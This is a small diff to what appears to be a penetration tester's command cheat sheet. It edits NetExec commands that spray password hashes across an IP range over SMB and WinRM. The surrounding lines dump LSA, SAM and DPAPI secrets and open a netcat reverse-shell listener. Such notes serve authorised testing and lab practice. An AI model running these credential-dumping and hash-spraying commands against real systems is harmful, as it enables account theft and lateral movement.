@@ -1689,8 +1689,8 @@ nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi -
 +---------- Crack Hashes ----------+
 
 +---------- Spray Hashes ----------+
-nxc smb 192.168.110.51-56 -u usernames -H hashes
-nxc winrm 192.168.110.51-56 -u usernames -H hashes
+nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
+nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
 +---------- Switch User: Known Creds ----------+
 rlwrap nc -lvnp 5566
